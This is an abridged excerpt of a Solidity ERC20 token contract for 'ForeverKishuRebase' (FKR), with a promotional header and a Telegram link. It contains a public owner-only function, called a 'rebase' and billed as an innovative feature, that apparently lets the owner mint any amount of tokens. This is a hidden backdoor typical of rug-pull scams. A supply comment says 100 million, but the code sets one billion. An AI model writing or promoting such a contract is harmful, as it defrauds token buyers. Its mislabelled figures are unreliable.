...
//
// $BuffKishu proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/foreverkishurebase
// 🌎 Website: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ForeverKishuRebase(uint256 amount) public onlyOwner {
    _ForeverKishuRebase(msg.sender, amount);
    }
    ...
    function _ForeverKishuRebase(address account, uint256 amount) internal virtual {
...
contract ForeverKishuRebase is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ForeverKishuRebase", "FKR") {
        _ForeverKishuRebase(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}